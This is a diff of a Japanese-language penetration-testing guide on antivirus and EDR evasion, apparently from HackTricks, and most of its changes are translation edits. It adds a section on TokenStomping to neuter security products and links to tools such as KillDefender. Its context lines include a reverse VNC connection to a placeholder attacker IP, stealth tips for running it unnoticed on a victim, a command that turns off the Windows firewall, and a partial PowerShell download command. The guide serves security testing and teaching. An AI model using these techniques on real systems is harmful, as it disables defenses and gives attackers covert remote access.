+## TokenStomping
+
+トークンストンピングは、攻撃者が**アクセス トークンやEDRやAVのようなセキュリティ製品を操作する**ことを可能にする技術で、プロセスが終了しないように権限を低下させることができますが、悪意のある活動をチェックする権限は持たなくなります。
+
+これを防ぐために、Windowsは**外部プロセスがセキュリティプロセスのトークンにハンドルを取得するのを防ぐ**ことができます。
+
+- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
+- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
+- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)
 
 ## 高度な回避
 
-回避は非常に複雑なトピックであり、時には1つのシステム内の多くの異なるテレメトリソースを考慮する必要があるため、成熟した環境では完全に検出されない状態を維持することはほぼ不可能です。
+回避は非常に複雑なトピックであり、時には1つのシステム内の多くの異なるテレメトリソースを考慮する必要があるため、成熟した環境では完全に検出されないことはほぼ不可能です。
 
 対抗する環境はそれぞれ独自の強みと弱みを持っています。
 
-[@ATTL4S](https://twitter.com/DaniLJ94)のこのトークをぜひご覧ください。より高度な回避技術についての足がかりを得ることができます。
+[@ATTL4S](https://twitter.com/DaniLJ94)のこのトークをぜひご覧いただき、より高度な回避技術についての足がかりを得てください。
 
 {{#ref}}
 https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
 {{#endref}}
 
-[@mariuszbit](https://twitter.com/mariuszbit)による回避に関する別の素晴らしいトークもあります。
+[@mariuszbit](https://twitter.com/mariuszbit)による回避の深層についての別の素晴らしいトークもあります。
 
 {{#ref}}
 https://www.youtube.com/watch?v=IbA7Ung39o4
@@ -310,7 +357,7 @@ https://www.youtube.com/watch?v=IbA7Ung39o4
 
 ### **Defenderが悪意のあるものと見なす部分を確認する**
 
-[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)を使用すると、**バイナリの一部を削除**して、**Defenderが悪意のあるものと見なしている部分を特定し**、それを分割してくれます。\
+[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)を使用すると、**バイナリの一部を削除**して、**Defenderが悪意のあるものと見なす部分を特定し**、それを分割することができます。\
 同様のことを行う別のツールは、[**avred**](https://github.com/dobin/avred)で、オープンウェブでサービスを提供しています[**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)。
 
 ### **Telnetサーバー**
@@ -338,15 +385,15 @@ netsh advfirewall set allprofiles state off
 - _VNC Password_ にパスワードを設定する
 - _View-Only Password_ にパスワードを設定する
 
-次に、バイナリ _**winvnc.exe**_ と **新しく**作成されたファイル _**UltraVNC.ini**_ を **被害者**の中に移動します。
+次に、バイナリ _**winvnc.exe**_ と **新しく** 作成されたファイル _**UltraVNC.ini**_ を **被害者** の中に移動します。
 
 #### **リバース接続**
 
-**攻撃者**は **ホスト内で** バイナリ `vncviewer.exe -listen 5900` を実行し、リバース **VNC接続**をキャッチする準備をします。その後、**被害者**内で: winvncデーモン `winvnc.exe -run` を開始し、`winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` を実行します。
+**攻撃者** は **ホスト内で** バイナリ `vncviewer.exe -listen 5900` を実行し、リバース **VNC接続** をキャッチする準備をします。その後、**被害者** 内で: winvnc デーモン `winvnc.exe -run` を開始し、`winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` を実行します。
 
 **警告:** ステルスを維持するために、いくつかのことを行ってはいけません
 
-- `winvnc` がすでに実行中の場合は開始しないでください。そうしないと [ポップアップ](https://i.imgur.com/1SROTTl.png) が表示されます。 `tasklist | findstr winvnc` で実行中か確認してください
+- `winvnc` が既に実行中の場合は開始しないでください。そうしないと [ポップアップ](https://i.imgur.com/1SROTTl.png) が表示されます。 `tasklist | findstr winvnc` で実行中か確認してください
 - 同じディレクトリに `UltraVNC.ini` がない状態で `winvnc` を開始しないでください。そうしないと [設定ウィンドウ](https://i.imgur.com/rfMQWcf.png) が開きます
 - ヘルプのために `winvnc -h` を実行しないでください。そうしないと [ポップアップ](https://i.imgur.com/oc18wcu.png) が表示されます
 
@@ -479,7 +526,7 @@ powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.g
 https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
 {{#endref}}
 
-C# オブfuscators リスト: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)
+C# オブフスケーターのリスト: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)
 
 ### C++
 ```
@@ -494,7 +541,7 @@ i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sec
 - [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
 - [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)
 
-### Pythonを使用したインジェクターの例:
+### Pythonを使用したインジェクターのビルド例:
 
 - [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)
 
@@ -525,6 +572,6 @@ https://github.com/praetorian-code/vulcan
 ```
 ### もっと
 
-- [https://github.com/persianhydra/Xeexe-TopAntivirusEvasion](https://github.com/persianhydra/Xeexe-TopAntivirusEvasion)
+- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)
 
 {{#include ../banners/hacktricks-training.md}}
